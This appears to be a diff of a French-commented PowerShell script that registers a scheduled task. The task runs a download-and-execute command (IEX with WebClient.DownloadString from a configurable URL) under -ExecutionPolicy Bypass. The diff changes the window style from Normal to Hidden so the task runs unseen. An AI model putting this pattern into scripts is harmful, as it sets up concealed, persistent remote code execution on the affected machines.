@@ -14,7 +14,7 @@ if (-not $User) {
 # Utilise -NoProfile et -ExecutionPolicy Bypass pour éviter les policies locales.
 $psCommand = "IEX (New-Object System.Net.WebClient).DownloadString('$ScriptUrl')"
 # Argument final pour scheduled task : -NoProfile -ExecutionPolicy Bypass -WindowStyle Normal -Command "<psCommand>"
-$argumentForTask = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Normal -Command `"$psCommand`""
+$argumentForTask = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$psCommand`""
 
 # --- Créer l'action / trigger / principal ---
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $argumentForTask
@@ -36,3 +36,4 @@ try {
     try { Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
     Write-Output "Tâche $TaskName supprimée."
 }
+
